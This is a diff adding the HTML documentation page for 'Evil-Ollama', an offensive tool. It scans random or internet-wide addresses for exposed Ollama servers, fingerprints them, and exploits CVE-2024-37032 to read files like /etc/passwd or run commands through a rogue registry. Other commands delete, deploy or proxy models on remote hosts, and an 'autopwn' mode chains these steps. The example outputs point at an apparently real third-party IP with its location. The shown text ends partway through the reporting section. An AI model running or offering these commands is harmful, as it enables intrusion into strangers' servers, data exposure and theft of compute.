@@ -1,0 +1,1052 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🦙 Evil-Ollama v3.2.0 — Documentation</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700;800&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg: #0a0a0f;
+            --bg2: #12121a;
+            --bg3: #1a1a2e;
+            --border: #2a2a3e;
+            --text: #e0e0e0;
+            --text-muted: #888;
+            --primary: #8b5cf6;
+            --primary-glow: #6d28d9;
+            --red: #ef4444;
+            --green: #34d399;
+            --yellow: #fbbf24;
+            --cyan: #22d3ee;
+            --orange: #f97316;
+            --gradient: linear-gradient(135deg, #8b5cf6, #6d28d9, #4c1d95);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        /* ANIMATED MATRIX BG */
+        .matrix-bg {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(139, 92, 246, 0.02) 2px,
+                rgba(139, 92, 246, 0.02) 4px
+            );
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* BANNER */
+        .banner {
+            text-align: center;
+            padding: 60px 20px 40px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .banner::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(139, 92, 246, 0.1), transparent);
+            pointer-events: none;
+        }
+
+        .banner .logo {
+            font-size: 4rem;
+            display: block;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 20px rgba(139, 92, 246, 0.3));
+        }
+
+        .banner h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+        }
+
+        .banner .version {
+            display: inline-block;
+            background: var(--bg3);
+            color: var(--primary);
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            border: 1px solid var(--border);
+            margin-top: 10px;
+        }
+
+        .banner p {
+            color: var(--text-muted);
+            margin-top: 15px;
+            font-size: 1.1rem;
+        }
+
+        .install-box {
+            display: inline-block;
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px 24px;
+            font-family: 'JetBrains Mono', monospace;
+            margin-top: 20px;
+            color: var(--green);
+            font-size: 1.1rem;
+        }
+
+        /* NAV */
+        .nav {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(10, 10, 15, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 0;
+        }
+
+        .nav-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+        }
+
+        .nav a:hover {
+            color: var(--primary);
+            background: var(--bg3);
+            border-color: var(--border);
+        }
+
+        /* SECTIONS */
+        .section {
+            margin-bottom: 50px;
+        }
+
+        .section-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 25px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .section-title .icon {
+            font-size: 1.5rem;
+        }
+
+        /* COMMAND CARDS */
+        .cmd-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+            gap: 16px;
+        }
+
+        .cmd-card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cmd-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 3px;
+            height: 100%;
+            background: var(--gradient);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .cmd-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(139, 92, 246, 0.1);
+        }
+
+        .cmd-card:hover::before {
+            opacity: 1;
+        }
+
+        .cmd-card .cmd-name {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+
+        .cmd-card .cmd-desc {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+
+        .cmd-card .cmd-flags {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--cyan);
+            line-height: 1.8;
+        }
+
+        .cmd-card .cmd-flags span {
+            display: inline-block;
+            background: rgba(34, 211, 238, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin: 2px 4px 2px 0;
+        }
+
+        .cmd-card .cmd-status {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-top: 8px;
+        }
+
+        .status-verified { background: rgba(52, 211, 153, 0.2); color: var(--green); }
+        .status-new { background: rgba(251, 191, 36, 0.2); color: var(--yellow); }
+
+        /* EXAMPLE BOX */
+        .example-box {
+            background: #0d0d1a;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin: 12px 0;
+            overflow-x: auto;
+        }
+
+        .example-box .prompt { color: var(--green); }
+        .example-box .output { color: var(--text-muted); }
+
+        .tag {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 10px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            margin: 2px;
+        }
+
+        .tag-red { background: rgba(239, 68, 68, 0.2); color: var(--red); }
+        .tag-green { background: rgba(52, 211, 153, 0.2); color: var(--green); }
+        .tag-blue { background: rgba(34, 211, 238, 0.2); color: var(--cyan); }
+        .tag-purple { background: rgba(139, 92, 246, 0.2); color: var(--primary); }
+        .tag-yellow { background: rgba(251, 191, 36, 0.2); color: var(--yellow); }
+
+        /* STATS BAR */
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+
+        .stat-card {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .stat-card .num {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--primary);
+        }
+
+        .stat-card .label {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            margin-top: 4px;
+        }
+
+        /* QUICK START */
+        .quick-start {
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+
+        .quick-start h3 {
+            color: var(--primary);
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+        }
+
+        .quick-start code {
+            display: block;
+            padding: 8px 16px;
+            background: #0d0d1a;
+            border-radius: 6px;
+            margin: 6px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            border-left: 3px solid var(--primary);
+        }
+
+        .quick-start .comment {
+            color: var(--text-muted);
+            font-size: 0.75rem;
+            margin-top: 2px;
+            margin-bottom: 10px;
+        }
+
+        /* FOOTER */
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid var(--border);
+            color: var(--text-muted);
+            font-size: 0.85rem;
+        }
+
+        .footer a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .banner h1 { font-size: 1.8rem; }
+            .cmd-grid { grid-template-columns: 1fr; }
+            .stats-bar { grid-template-columns: repeat(2, 1fr); }
+        }
+
+        /* GLOW ANIMATION */
+        @keyframes pulse-glow {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        .glow-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            animation: pulse-glow 2s infinite;
+            margin-right: 6px;
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg"></div>
+
+    <!-- NAV -->
+    <nav class="nav">
+        <div class="nav-inner">
+            <a href="#overview">Overview</a>
+            <a href="#scan">Scan</a>
+            <a href="#fingerprint">Fingerprint</a>
+            <a href="#vuln">Vuln</a>
+            <a href="#exploit">Exploit</a>
+            <a href="#models">Models</a>
+            <a href="#api">API Ops</a>
+            <a href="#proxy">Proxy</a>
+            <a href="#chat">Chat</a>
+            <a href="#export">Export</a>
+            <a href="#autopwn">AutoPWN</a>
+            <a href="#config">Config</a>
+            <a href="#examples">Examples</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <!-- BANNER -->
+        <div class="banner">
+            <span class="logo">🦙</span>
+            <h1>Evil-Ollama</h1>
+            <span class="version">v3.2.0</span>
+            <p>Exposed Ollama Instance Hunter, Proxy &amp; API Manipulation Tool<br>For authorized security testing only</p>
+            <div class="install-box">$ pip install evil-ollama</div>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats-bar">
+            <div class="stat-card"><div class="num">30+</div><div class="label">Commands</div></div>
+            <div class="stat-card"><div class="num">70+</div><div class="label">Flags/Options</div></div>
+            <div class="stat-card"><div class="num">9.1</div><div class="label">CVSS Max</div></div>
+            <div class="stat-card"><div class="num">6</div><div class="label">CVE Support</div></div>
+            <div class="stat-card"><div class="num">26/26</div><div class="label">Tests Passed</div></div>
+        </div>
+
+        <!-- QUICK START -->
+        <div class="quick-start" id="overview">
+            <h3>⚡ Quick Start</h3>
+            <code class="prompt"># Install</code>
+            <code>pip install evil-ollama</code>
+            <div class="comment">— or upgrade —</div>
+            <code>pip install --upgrade evil-ollama</code>
+            
+            <code class="prompt" style="margin-top:16px;"># Scan random IPs</code>
+            <code>evilollama scan --random 10000 --geo --notify</code>
+            
+            <code class="prompt" style="margin-top:16px;"># Full internet scan</code>
+            <code>evilollama scan --internet</code>
+            
+            <code class="prompt" style="margin-top:16px;"># Fingerprint a target</code>
+            <code>evilollama fingerprint -t 1.2.3.4:11434 --geo</code>
+            
+            <code class="prompt" style="margin-top:16px;"># Vulnerability scan</code>
+            <code>evilollama vuln -t 1.2.3.4:11434 --notify</code>
+            
+            <code class="prompt" style="margin-top:16px;"># Exploit CVE</code>
+            <code>evilollama exploit --cve CVE-2024-37032 -t 1.2.3.4:11434</code>
+            
+            <code class="prompt" style="margin-top:16px;"># Interactive chat</code>
+            <code>evilollama chat -t 1.2.3.4:11434</code>
+            
+            <code class="prompt" style="margin-top:16px;"># Auto-PWN (scan → vuln → proxy)</code>
+            <code>evilollama autopwn --random 5000</code>
+
+            <code class="prompt" style="margin-top:16px;"># View this documentation</code>
+            <code>evilollama docs</code>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 1. SCANNING -->
+        <!-- ============================================================ -->
+        <div class="section" id="scan">
+            <div class="section-title"><span class="icon">🔍</span> Scanning &amp; Discovery</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --random &lt;N&gt;</div>
+                    <div class="cmd-desc">Scan N random public IPs for exposed Ollama instances on port 11434. Uses async TCP connect scan with configurable concurrency.</div>
+                    <div class="cmd-flags">
+                        <span>--random 10000</span> <span>--port 11434</span> <span>--concurrent 100</span>
+                        <span>--geo</span> <span>--export html</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --cidr &lt;CIDR&gt;</div>
+                    <div class="cmd-desc">Scan an entire CIDR range (e.g., 10.0.0.0/8). Expands all IPs in range and scans them.</div>
+                    <div class="cmd-flags">
+                        <span>--cidr 10.0.0.0/8</span> <span>--port 11434</span>
+                        <span>--geo</span> <span>--export html</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --file &lt;file&gt;</div>
+                    <div class="cmd-desc">Scan IPs from a text file (one IP per line). Useful for custom target lists.</div>
+                    <div class="cmd-flags">
+                        <span>--file targets.txt</span> <span>--port 11434</span>
+                        <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --shodan &lt;API_KEY&gt;</div>
+                    <div class="cmd-desc">Search Shodan.io for exposed Ollama instances. Uses Shodan search API to find internet-facing instances.</div>
+                    <div class="cmd-flags">
+                        <span>--shodan API_KEY</span> <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --censys &lt;ID:SECRET&gt;</div>
+                    <div class="cmd-desc">Search Censys for exposed Ollama instances. Uses Censys search API with format ID:SECRET.</div>
+                    <div class="cmd-flags">
+                        <span>--censys ID:SECRET</span> <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --fofa &lt;EMAIL:KEY&gt;</div>
+                    <div class="cmd-desc">Search FOFA for exposed Ollama instances. Uses FOFA search API with format EMAIL:KEY.</div>
+                    <div class="cmd-flags">
+                        <span>--fofa EMAIL:KEY</span> <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --dns &lt;domain&gt;</div>
+                    <div class="cmd-desc">Discover Ollama instances via DNS resolution on a domain. Resolves common subdomain patterns.</div>
+                    <div class="cmd-flags">
+                        <span>--dns example.com</span> <span>--port 11434</span> <span>--geo</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">scan --ct &lt;domain&gt;</div>
+                    <div class="cmd-desc">Discover instances via Certificate Transparency logs. Fetches subdomains from crt.sh.</div>
+                    <div class="cmd-flags">
+                        <span>--ct example.com</span> <span>--port 11434</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card" style="border-color: var(--primary); border-width: 2px;">
+                    <div class="cmd-name">scan --internet 🌐</div>
+                    <div class="cmd-desc"><strong>FULL INTERNET-WIDE SCAN</strong> — 3-phase attack: Phase 1 scans 50,000 random IPs, Phase 2 does DNS discovery on top cloud domains, Phase 3 searches CT logs. The ultimate discovery command.</div>
+                    <div class="cmd-flags">
+                        <span>--internet</span> <span>--port 11434</span> <span>--concurrent 1000</span>
+                        <span>--geo</span> <span>--export html</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-new">🚀 New</span>
+                    <div class="example-box" style="margin-top:10px;">
+                        <span class="prompt">$ evilollama scan --internet --notify</span>
+                        <br><span class="output">🌐 INTERNET-WIDE SCAN MODE</span>
+                        <br><span class="output">Phase 1/3: Scanning 50000 random IPs...</span>
+                        <br><span class="output">Phase 2/3: DNS discovery on cloud domains...</span>
+                        <br><span class="output">Phase 3/3: CT log search...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 2. FINGERPRINT -->
+        <!-- ============================================================ -->
+        <div class="section" id="fingerprint">
+            <div class="section-title"><span class="icon">🆔</span> Fingerprinting</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">fingerprint -t &lt;IP:PORT&gt;</div>
+                    <div class="cmd-desc">Deep fingerprint an Ollama instance. Extracts version, all models, running models, total size, accessible endpoints, GPU info, and CVE data. Most detailed recon command.</div>
+                    <div class="cmd-flags">
+                        <span>-t 1.2.3.4:11434</span> <span>--all</span> <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                    <div class="example-box" style="margin-top:10px;">
+                        <span class="prompt">$ evilollama fingerprint -t 200.137.215.69:11434 --geo</span>
+                        <br><span class="output">🦙 Fingerprint: 200.137.215.69:11434</span>
+                        <br><span class="output">Version:   0.20.7</span>
+                        <br><span class="output">Models:    45 (gemma:2B, gemma4:26b, ...)</span>
+                        <br><span class="output">Running:   gemma4:26b (1)</span>
+                        <br><span class="output">Total:     323.82 GB</span>
+                        <br><span class="output">Location:  Goiânia, Brazil</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 3. VULNERABILITY -->
+        <!-- ============================================================ -->
+        <div class="section" id="vuln">
+            <div class="section-title"><span class="icon">💀</span> Vulnerability Scanning</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">vuln -t &lt;IP:PORT&gt;</div>
+                    <div class="cmd-desc">Comprehensive vulnerability scan. Checks for: No Authentication, RCE via Crafted Model Import, SSRF in Model Pulling, Response Timing issues, and missing CSRF protection.</div>
+                    <div class="cmd-flags">
+                        <span>-t 1.2.3.4:11434</span> <span>--all</span> <span>-o results.json</span>
+                        <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                    <div class="example-box" style="margin-top:10px;">
+                        <span class="prompt">$ evilollama vuln -t 200.137.215.69:11434 --geo</span>
+                        <br><span class="output">💀 [CRITICAL] Potential RCE via Crafted Model Import</span>
+                        <br><span class="output">💀 [HIGH    ] No Authentication Required</span>
+                        <br><span class="output">💀 [HIGH    ] Potential SSRF in Model Pulling</span>
+                        <br><span class="output">📍 Location: Goiânia, Brazil</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 4. EXPLOIT -->
+        <!-- ============================================================ -->
+        <div class="section" id="exploit">
+            <div class="section-title"><span class="icon">💥</span> Exploit Module</div>
+            <div class="cmd-grid">
+                <div class="cmd-card" style="border-color: var(--red); border-width: 1px;">
+                    <div class="cmd-name">exploit --list</div>
+                    <div class="cmd-desc">List all CVEs supported by the exploit module with name, type, CVSS score, affected versions, and fixed version.</div>
+                    <div class="cmd-flags"><span>--list</span></div>
+                    <span class="cmd-status status-new">🆕 v3.2.0</span>
+                </div>
+
+                <div class="cmd-card" style="border-color: var(--red); border-width: 1px;">
+                    <div class="cmd-name">exploit --cve CVE-2024-37032 -t &lt;IP&gt;</div>
+                    <div class="cmd-desc">Check if target is vulnerable to Probllama — Ollama Path Traversal RCE (CVSS 9.1). Affects Ollama &lt; 0.1.34.</div>
+                    <div class="cmd-flags">
+                        <span>--cve CVE-2024-37032</span> <span>-t 1.2.3.4:11434</span>
+                        <span>--host MY_IP</span> <span>--lport 9999</span>
+                        <span>--read /etc/passwd</span> <span>--rce</span> <span>--cmd id</span>
+                    </div>
+                    <span class="cmd-status status-new">🆕 v3.2.0</span>
+                </div>
+
+                <div class="cmd-card" style="border-color: var(--red); border-width: 1px;">
+                    <div class="cmd-name">exploit --cve CVE-2024-37032 --host IP --read FILE</div>
+                    <div class="cmd-desc">Full arbitrary file read exploit. Starts a rogue OCI registry that serves malicious manifests with path traversal payloads. Requires attacker public IP.</div>
+                    <div class="cmd-flags">
+                        <span>--cve CVE-2024-37032</span> <span>-t VICTIM_IP</span>
+                        <span>--host YOUR_IP</span> <span>--read /etc/passwd</span>
+                    </div>
+                    <span class="cmd-status status-new">🆕 v3.2.0</span>
+                </div>
+
+                <div class="cmd-card" style="border-color: var(--red); border-width: 1px;">
+                    <div class="cmd-name">exploit --cve CVE-2024-37032 --host IP --rce --cmd "id"</div>
+                    <div class="cmd-desc">Full Remote Code Execution exploit. Two-step: write malicious .so via path traversal, then trigger ld.so.preload. Requires Docker-based target.</div>
+                    <div class="cmd-flags">
+                        <span>--cve CVE-2024-37032</span> <span>-t VICTIM_IP</span>
+                        <span>--host YOUR_IP</span> <span>--rce</span> <span>--cmd "id"</span>
+                    </div>
+                    <span class="cmd-status status-new">🆕 v3.2.0</span>
+                </div>
+            </div>
+
+            <div class="quick-start" style="margin-top:20px;">
+                <h3>📋 Supported CVEs</h3>
+                <table style="width:100%; border-collapse: collapse; font-size:0.9rem;">
+                    <tr style="border-bottom:1px solid var(--border);">
+                        <th style="padding:10px; text-align:left; color:var(--primary);">CVE</th>
+                        <th style="padding:10px; text-align:left; color:var(--primary);">Name</th>
+                        <th style="padding:10px; text-align:left; color:var(--primary);">Type</th>
+                        <th style="padding:10px; text-align:left; color:var(--primary);">CVSS</th>
+                        <th style="padding:10px; text-align:left; color:var(--primary);">Affected</th>
+                    </tr>
+                    <tr style="border-bottom:1px solid var(--border);">
+                        <td style="padding:10px; color:var(--red);">CVE-2024-37032</td>
+                        <td style="padding:10px;">Probllama — Path Traversal RCE</td>
+                        <td style="padding:10px;"><span class="tag tag-red">path_traversal</span></td>
+                        <td style="padding:10px;">9.1 🔴</td>
+                        <td style="padding:10px;">&lt; 0.1.34</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 5. MODEL OPERATIONS -->
+        <!-- ============================================================ -->
+        <div class="section" id="models">
+            <div class="section-title"><span class="icon">📦</span> Model Operations</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">models -t &lt;IP:PORT&gt;</div>
+                    <div class="cmd-desc">List all models on a remote instance. Shows model names, sizes, quantization levels, and families.</div>
+                    <div class="cmd-flags"><span>-t 1.2.3.4:11434</span> <span>--geo</span> <span>--notify</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">models --pull TARGET MODEL</div>
+                    <div class="cmd-desc">Pull model info from a target. Retrieves detailed manifest data.</div>
+                    <div class="cmd-flags"><span>--pull 1.2.3.4:11434 gemma:2b</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">models --analyze TARGET MODEL</div>
+                    <div class="cmd-desc">Deep analyze a specific model via /api/show. Returns full Modelfile, parameters, template, and system prompt.</div>
+                    <div class="cmd-flags"><span>--analyze 1.2.3.4:11434 gemma:2b</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">deploy -m MODEL -t &lt;IP&gt;</div>
+                    <div class="cmd-desc">Deploy (pull) a model onto a remote instance via /api/pull. Can deploy to all saved instances with --all.</div>
+                    <div class="cmd-flags">
+                        <span>-m gemma:2b</span> <span>-t 1.2.3.4:11434</span>
+                        <span>--all</span> <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">push -t &lt;IP&gt; -m MODEL:TAG</div>
+                    <div class="cmd-desc">Push a model from a remote instance to a registry via /api/push. Requires registry authentication.</div>
+                    <div class="cmd-flags"><span>-t 1.2.3.4:11434</span> <span>-m mymodel:tag</span> <span>--notify</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">create -t &lt;IP&gt; -m MODEL [--modelfile|--from]</div>
+                    <div class="cmd-desc">Create a model via /api/create. Provide a Modelfile or base model name to create from.</div>
+                    <div class="cmd-flags">
+                        <span>-t 1.2.3.4:11434</span> <span>-m newmodel</span>
+                        <span>--modelfile ./Modelfile</span> <span>--from base:latest</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">copy -t &lt;IP&gt; -s SRC -d DST</div>
+                    <div class="cmd-desc">Copy a model within a remote instance via /api/copy. Useful for model cloning.</div>
+                    <div class="cmd-flags">
+                        <span>-t 1.2.3.4:11434</span> <span>-s old:latest</span>
+                        <span>-d new:latest</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">remove -t &lt;IP&gt; -m MODEL:TAG</div>
+                    <div class="cmd-desc">Delete a model from a remote instance via /api/delete. Irreversible.</div>
+                    <div class="cmd-flags"><span>-t 1.2.3.4:11434</span> <span>-m model:tag</span> <span>--notify</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">ps -t &lt;IP:PORT&gt;</div>
+                    <div class="cmd-desc">List currently running models on the instance via /api/ps. Shows name, size, and expiry.</div>
+                    <div class="cmd-flags"><span>-t 1.2.3.4:11434</span> <span>--notify</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 6. AI OPS -->
+        <!-- ============================================================ -->
+        <div class="section" id="api">
+            <div class="section-title"><span class="icon">🤖</span> AI / Inference Operations</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">embed -t &lt;IP&gt; -m MODEL -p "text"</div>
+                    <div class="cmd-desc">Generate embeddings via /api/embed. Returns vector dimensions and first 8 values. Supports any embedding model.</div>
+                    <div class="cmd-flags">
+                        <span>-t 1.2.3.4:11434</span> <span>-m nomic-embed-text</span>
+                        <span>-p "hello world"</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                    <div class="example-box" style="margin-top:10px;">
+                        <span class="prompt">$ evilollama embed -t 200.137.215.69:11434 -m nomic-embed-text -p "hi"</span>
+                        <br><span class="output">✅ Embedding generated — dimensions: 768</span>
+                        <br><span class="output">First 8 values: [0.012, -0.034, ...]</span>
+                        <br><span class="output">Total dimensions: 768</span>
+                    </div>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">generate -t &lt;IP&gt; -m MODEL -p "prompt"</div>
+                    <div class="cmd-desc">Generate text completion via /api/generate. Returns model response + version info.</div>
+                    <div class="cmd-flags">
+                        <span>-t 1.2.3.4:11434</span> <span>-m gemma:2b</span>
+                        <span>-p "tell me a joke"</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">chat -t &lt;IP:PORT&gt;</div>
+                    <div class="cmd-desc">Interactive chat with remote model. Full duplex conversation with context retention. Type 'exit' to quit.</div>
+                    <div class="cmd-flags"><span>-t 1.2.3.4:11434</span> <span>--batch prompts.txt</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">chat --batch &lt;FILE&gt;</div>
+                    <div class="cmd-desc">Batch execute prompts from a file (one per line). Saves results to JSON with timestamps.</div>
+                    <div class="cmd-flags"><span>-t 1.2.3.4:11434</span> <span>--batch prompts.txt</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 7. PROXY -->
+        <!-- ============================================================ -->
+        <div class="section" id="proxy">
+            <div class="section-title"><span class="icon">🔌</span> Proxy</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">proxy -t &lt;IP:PORT&gt;</div>
+                    <div class="cmd-desc">Start an OpenAI-compatible proxy to a remote Ollama instance. Exposes OpenAI API format at localhost:8080. All requests are forwarded to the target.</div>
+                    <div class="cmd-flags">
+                        <span>-t 1.2.3.4:11434</span> <span>-p 8080</span>
+                        <span>--host 127.0.0.1</span> <span>--socks</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                    <div class="example-box" style="margin-top:10px;">
+                        <span class="prompt">$ evilollama proxy -t 200.137.215.69:11434 -p 9090</span>
+                        <br><span class="output">🔌 Proxy started → http://200.137.215.69:11434</span>
+                        <br><span class="output">   Listening on 127.0.0.1:9090</span>
+                        <br><span class="output">   OpenAI API: http://127.0.0.1:9090/v1</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 8. REPORTING -->
+        <!-- ============================================================ -->
+        <div class="section" id="export">
+            <div class="section-title"><span class="icon">📊</span> Reporting &amp; Display</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">show</div>
+                    <div class="cmd-desc">Display all found instances with details: IP, port, version, models, running count, size, location, and quick-action commands.</div>
+                    <div class="cmd-flags"><span>--geo</span> <span>--notify</span> <span>--export html</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">export --format &lt;TYPE&gt;</div>
+                    <div class="cmd-desc">Export found instances. Supports HTML (beautiful dark report), CSV (spreadsheet-ready), JSON (machine-parseable), or ALL formats at once.</div>
+                    <div class="cmd-flags">
+                        <span>--format html</span> <span>--format csv</span>
+                        <span>--format json</span> <span>--format all</span>
+                        <span>-o report.html</span> <span>--notify</span>
+                    </div>
